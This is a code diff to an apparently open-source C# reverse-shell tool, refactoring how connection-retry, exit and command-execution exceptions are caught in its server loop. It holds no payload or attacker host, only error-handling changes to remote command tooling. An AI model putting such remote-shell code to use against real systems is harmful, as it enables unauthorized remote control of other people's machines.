@@ -73,16 +73,18 @@ namespace ReverseShellServer
                         {
                             RunServer(connectionSettings.Item1, connectionSettings.Item2);
                         }
-                        catch (Exception ex)
+                        catch (NetworkException)
                         {
                             // Exceptions thrown trigger the network manager cleanup
                             Cleanup();
-
-                            // The client asked to stop the connection, break from the connection loop
-                            if(ex.GetType() == typeof(ExitException)) break;
-
                             connectionRetryCount--;
                             Thread.Sleep(clientConnectionRetryDelay);
+                        }
+                        catch (ExitException)
+                        {
+                            Cleanup();
+                            // The client asked to stop the connection, break from the connection loop
+                            break;
                         }
                     }
                 }
@@ -109,21 +111,14 @@ namespace ReverseShellServer
             // Reset retry count
             connectionRetryCount++;
 
-            // While there is no exception, wait for incoming data and process it
+            // Wait for incoming data and process it
             while (true)
             {
-                try
-                {
-                    var incomingData = networkManager.ReadLine();
-                    // A simple dot beeing received is the client's connection monitoring sending a hearthbeat message
-                    if(incomingData == ".")
-                        continue;
-                    ProcessCommand(incomingData);
-                }
-                catch (StopServerException)
-                {
-                    StopServer();
-                }
+                var incomingData = networkManager.ReadLine();
+                // A simple dot beeing received is the client's connection monitoring sending a hearthbeat message
+                if(incomingData == ".")
+                    continue;
+                ProcessCommand(incomingData);
             }
         }
 
@@ -145,8 +140,24 @@ namespace ReverseShellServer
 
             var command = commandsManager.GetCommandByName(commandName);
 
-            // Exceptions are caught and treated by the calling method
-            command?.Process(arguments);
+            try
+            {
+                // Command executed here
+                command?.Process(arguments);
+            }
+            catch (StopServerException)
+            {
+                StopServer();
+            }
+            catch (Exception ex)
+            {
+                if (ex.GetType() == typeof(ExitException) || ex.GetType() == typeof(NetworkException))
+                {
+                    throw;
+                }
+
+                // If the exception isn't an ExitException or a NetworkException, just continue
+            }
         }
 
 
